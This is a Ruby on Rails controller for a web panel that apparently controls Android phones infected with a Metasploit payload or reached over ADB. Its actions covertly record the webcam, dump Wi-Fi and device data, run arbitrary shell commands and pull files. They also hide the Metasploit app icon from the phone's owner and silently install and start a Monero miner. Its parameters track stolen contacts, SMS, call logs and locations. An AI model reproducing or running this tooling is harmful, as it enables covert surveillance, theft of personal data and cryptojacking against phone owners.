
class SmartphonesController < InheritedResources::Base
  @@isWebcamRecordOn=false

  def dump_sysinfo
    processCommand="sysinfo"
    commandOutput=start_msf_process(processCommand)
    respond_to do |format|
        format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
      end
  end

  def webcam_record
    commandOutput=[]
    if !@@isWebcamRecordOn
        commandTimeout=params[:exec_timeout].to_i
        camera=params[:back_camera] == "true" ? '1' : '2'
        currentTime = DateTime.now
        currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
        @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
        @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
        processCommand="webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
        commandOutput=start_msf_process(processCommand)
        isOperationSuccessful=false
        1.upto(commandTimeout) do |n|
            if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
              isOperationSuccessful = true
              @@isWebcamRecordOn = true
              break
            else
                puts "Waiting ..."
            end
            sleep 1
        end
        commandOutput=["Operation Failed"] if not isOperationSuccessful
    else
        commandOutput.append('Control+Z')
        commandOutput.append(detach_session)
        @@isWebcamRecordOn = false
    end
    respond_to do |format|
        format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
      end
end





def set_audio_mode
  processCommand="set_audio_mode -m #{@@soundMode}"
  commandOutput=start_msf_process(processCommand)
  @@soundMode=@@soundMode == 2 ? 0 : 2
  respond_to do |format|
      format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
    end
end





def dump_wifi_info
    begin
        if @@isAdbConnected
            commandOutput=run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="')
        else
            start_msf_process("shell")
            processCommand='dumpsys wifi | grep SSID: | grep -v rt='
            commandOutput=start_msf_process(processCommand)
            detach_session
        end
    rescue
        commandOutput="Operation Failed"
        puts "Error dumping wi-fi info."
    end
    respond_to do |format|
        format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def dump_localtime
  processCommand="localtime"
  commandOutput=start_msf_process(processCommand)
  respond_to do |format|
      format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
    end
end





def uninstall_app
    begin
        appName=params[:app]
        if ! appName.empty?
            if @@isAdbConnected
              commandOutput=run_adb_command("uninstall #{appName}")
            else
              processCommand="app_uninstall #{params[:app]}"
              commandOutput=start_msf_process(processCommand)
            end
        end
        commandOutput=["Installation done."]
    rescue
        commandOutput=["Operation Failed"]
        puts "Error uninstalling app."
    end
    respond_to do |format|
        format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
    end
end





def list_apps
    begin
        apps_type=params[:system_apps] == 'true' ? '-s' : '-u'
        if @@isAdbConnected
          apps_type = '-3' if apps_type == '-u'
            commandOutput=run_adb_command('shell "pm list packages "' + apps_type).split("\n")
        else
            processCommand="app_list #{apps_type}"
            commandOutput=start_msf_process(processCommand)
        end
    rescue
        commandOutput=["Operation Failed"]
        puts "Error listing apps." 
    end
    respond_to do |format|
        format.js { render "list_apps", :locals => {:commandOutput => commandOutput}  }
    end
end




def upload_file
    begin
        push_file=params[:push_file]
        destination=params[:destination]
        if @@isAdbConnected
            commandOutput=run_adb_command('push ' + push_file + ' ' + destination).split("\n")
        else
            processCommand='upload ' + push_file + ' ' + destination
            commandOutput=start_msf_process(processCommand)
        end
    rescue
        puts "Error uploading file."
        commandOutput=["Operation Failed"]
    end
    respond_to do |format|
        format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def wake_lock
    begin
        processCommand="wakelock -w"
        commandOutput=start_msf_process(processCommand)
    rescue
        puts "Error unlocking screen"
        commandOutput="Operation Failed"
    end
    respond_to do |format|
        format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
    end
end




def run_shell_command
  begin
      command=params[:command]
      if @@isAdbConnected
          commandOutput=run_adb_command('shell "' + command + '"').split("\n")
      else
          start_msf_process("shell")
          commandOutput=start_msf_process(command)
          detach_session
      end
  rescue
      puts "Error running shell command."
      commandOutput=["Operation Failed"]
  end
  respond_to do |format|
      format.js { render "run_shell_command", :locals => {:commandOutput => commandOutput.split('\n')}  }
  end
end





def open_app
    begin
        app=params[:app]
        if @@isAdbConnected
          commandOutput=run_adb_command('shell "am start -n ' + app + '"').split("\n")
        else
          processCommand="app_run " + app
          commandOutput=start_msf_process(processCommand)
        end
    rescue
        puts "Error opening app."
        commandOutput=["Operation Failed"]
    end
    respond_to do |format|
        format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
    end
end





def install_apk
    begin
        app=params[:app]
        if @@isAdbConnected
            commandOutput=run_adb_command('install ' + app).split("\n")
        else
            processCommand="app_install " + app
            commandOutput=start_msf_process(processCommand)
        end
    rescue
        puts "Error installing app."
        commandOutput=["Operation Failed"]
    end
    respond_to do |format|
        format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
    end
end




def dump_device_info
    begin
        if @@isAdbConnected
            commandOutput=run_adb_command('shell "getprop ro.product.model"').split("\n")
        else
            start_msf_process("shell")
            processCommand='getprop ro.product.model'
            commandOutput=start_msf_process(processCommand)
            detach_session
        end
    rescue
        puts "Error dumping device info."
        commandOutput=["Operation Failed"]
    end
    respond_to do |format|
        format.js { render "dump_device_info", :locals => {:commandOutput => commandOutput}  }
    end
end




def pull_file
    begin
        pull_file=params[:pull_file]
        destination=params[:destination]
        if @@isAdbConnected
            commandOutput=run_adb_command("pull " + pull_file + " " + destination).split("\n")
        else
            processCommand='pull ' + pull_file + " " + destination
            commandOutput=start_msf_process(processCommand)
        end
    rescue
        puts "Error pulling file."
        commandOutput=["Operation Failed"]
    end
    respond_to do |format|
        format.js { render "pull_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def hide_app
  begin
      if @@isAdbConnected
        run_adb_command('shell "pm hide com.metasploit.stage"')
      else
        processCommand="hide_app_icon"
        start_msf_process(processCommand)
      end
      commandOutput=["App icon hidden."]
  rescue
      commandOutput=["Operation Failed"]
      puts "Error hiding app icon."
  end
  respond_to do |format|
      format.js { render "hide_app", :locals => {:commandOutput => commandOutput}  }
  end
end

def show_app
  begin
      run_adb_command('shell "pm unhide com.metasploit.stage"')
      commandOutput=["App icon unhidden."]
  rescue
      commandOutput=["Operation Failed"]
      puts "Error unhiding app icon."
  end
  respond_to do |format|
      format.js { render "show_app", :locals => {:commandOutput => commandOutput}  }
  end
end



def crypto_minner
  begin
      run_adb_command('install tools\\platform-tools\\monero-miner.apk')
      run_adb_command('shell "am start -n de.ludetis.monerominer/.MainActivity"')
      commandOutput=["Started mining."]
  rescue
      commandOutput=["Operation Failed"]
      puts "Error on crypto minner."
  end
  respond_to do |format|
      format.js { render "crypto_minner", :locals => {:commandOutput => commandOutput}  }
  end
end











    



    


    


    def dropdown_list_smartphones
        render locals: {smartphones: smartphones, smartphone:smartphone}
      end

    def select_smartphone
        redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: params[:smartphone_id]
    end


    def load
        render
    end

    def install
        path = "installsomething.txt"
        content = "data from the form"
        File.open(path, "w+") do |f|
        f.write(content)
        end
    end





    

  private

    def smartphone_params
      params.require(:smartphone).permit(:operating_system, :name, :pictures, :screenshots, :videos, :recordings, :is_rooted, :call_logs, :contacts, :sms_messages, :geo_locations, :is_app_hidden)
    end





end
